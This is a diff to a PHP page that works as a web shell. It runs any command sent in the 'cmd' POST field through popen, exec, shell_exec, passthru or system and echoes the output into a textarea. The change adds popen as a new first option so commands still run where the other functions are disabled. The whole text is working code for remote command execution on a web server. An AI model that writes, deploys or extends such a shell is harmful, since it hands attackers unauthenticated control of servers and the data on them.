@@ -84,7 +84,12 @@
         <textarea readonly="readonly" rows="25" class="cmd-box">
 <?php
     if($execute) {
-        if(function_exists("exec")) {
+        if(function_exists("popen")) {
+            $exec_func = "popen";
+            $handle = popen($_POST["cmd"], "r");
+            echo htmlspecialchars(stream_get_contents($handle));
+            $exit_code = pclose($handle);
+        } else if(function_exists("exec")) {
             $exec_func = "exec";
             exec($_POST["cmd"], $output, $exit_code);
             echo htmlspecialchars(implode("\n", $output));
@@ -99,7 +104,7 @@
             system($_POST["cmd"], $exit_code);
         } else {
             echo "Error - All of the following execution functions have been disabled in PHP:\n";
-            echo "exec\nshell_exec\npassthru\nsystem\n";
+            echo "popen\nexec\nshell_exec\npassthru\nsystem\n";
         }
     }
 ?>
